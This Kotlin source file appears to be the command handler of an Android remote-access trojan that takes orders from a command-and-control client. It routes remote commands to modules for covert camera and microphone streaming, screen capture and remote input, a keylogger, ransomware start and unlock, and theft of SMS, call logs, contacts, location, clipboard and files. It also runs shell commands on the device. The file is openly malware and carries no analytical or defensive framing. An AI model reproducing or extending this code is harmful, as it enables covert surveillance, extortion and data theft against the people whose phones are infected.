package com.ihk909.payload

import android.content.Context
import android.util.Log
import com.ihk909.payload.modules.AppsModule
import com.ihk909.payload.modules.AudioModule
import com.ihk909.payload.modules.CallLogModule
import com.ihk909.payload.modules.CameraModule
import com.ihk909.payload.modules.ClipModule
import com.ihk909.payload.modules.ContactModule
import com.ihk909.payload.modules.ControlModule
import com.ihk909.payload.modules.FilesModule
import com.ihk909.payload.modules.InfoModule
import com.ihk909.payload.modules.KeyloggerModule
import com.ihk909.payload.modules.LocationModule
import com.ihk909.payload.modules.RansomModule
import com.ihk909.payload.modules.ScreenModule
import com.ihk909.payload.modules.ShellModule
import com.ihk909.payload.modules.SmsModule
import com.ihk909.payload.modules.UiModule
import org.json.JSONObject

object CommandHandler {
    private const val tag = "CMD"

    fun handle(ctx: Context, c2: C2Client, msg: JSONObject) {
        runCatching {
            val id = msg.optString("id", "")
            val cmd = msg.getString("cmd")
            val args = msg.optJSONObject("args") ?: JSONObject()

            when (cmd) {
                "ping" -> c2.reply(id, JSONObject().put("pong", System.currentTimeMillis()))
                "info" -> InfoModule.get(ctx, c2, id, args)

                "ui.toast" -> UiModule.toast(ctx, c2, id, args)
                "ui.dialog" -> UiModule.dialog(ctx, c2, id, args)
                "ui.notification" -> UiModule.notification(ctx, c2, id, args)
                "ui.wallpaper" -> UiModule.wallpaper(ctx, c2, id, args)
                "ui.vibrate" -> UiModule.vibrate(ctx, c2, id, args)
                "ui.wake.lock" -> UiModule.wakeLock(ctx, c2, id, args)

                "camera.snap" -> CameraModule.snap(ctx, c2, id, args)
                "camera.stream.start" -> CameraModule.startStream(ctx, c2, id, args)
                "camera.stream.stop" -> CameraModule.stopStream(ctx, c2, id, args)

                "audio.record" -> AudioModule.record(ctx, c2, id, args)
                "audio.live.start" -> AudioModule.startLive(ctx, c2, id, args)
                "audio.live.stop" -> AudioModule.stopLive(ctx, c2, id, args)

                "screen.snap" -> ScreenModule.snap(ctx, c2, id, args)
                "screen.gesture" -> ControlModule.gesture(ctx, c2, id, args)
                "screen.text" -> ControlModule.text(ctx, c2, id, args)

                "ransom.start" -> RansomModule.start(ctx, c2, id, args)
                "ransom.unlock" -> RansomModule.unlock(ctx, c2, id, args)

                "keylog.start" -> {
                    KeyloggerModule.setEnabled(ctx, true)
                    c2.reply(id, JSONObject().put("on", true))
                }
                "keylog.stop" -> {
                    KeyloggerModule.setEnabled(ctx, false)
                    c2.reply(id, JSONObject().put("on", false))
                }

                "sms.list" -> SmsModule.list(ctx, c2, id, args)
                "sms.send" -> SmsModule.send(ctx, c2, id, args)
                "calls.list" -> CallLogModule.list(ctx, c2, id, args)
                "contacts.list" -> ContactModule.list(ctx, c2, id, args)
                "location.get" -> LocationModule.get(ctx, c2, id, args)

                "files.list" -> FilesModule.list(ctx, c2, id, args)
                "files.download" -> FilesModule.download(ctx, c2, id, args)
                "files.upload" -> FilesModule.upload(ctx, c2, id, args)
                "files.delete" -> FilesModule.delete(ctx, c2, id, args)

                "app.list" -> AppsModule.list(ctx, c2, id, args)
                "app.launch" -> AppsModule.launch(ctx, c2, id, args)
                "app.kill" -> AppsModule.kill(ctx, c2, id, args)

                "clip.get" -> ClipModule.get(ctx, c2, id, args)
                "clip.set" -> ClipModule.set(ctx, c2, id, args)

                "shell.exec" -> ShellModule.exec(ctx, c2, id, args)

                else -> c2.replyError(id, "unknown: $cmd")
            }
        }.onFailure { Log.e(tag, "handle", it) }
    }
}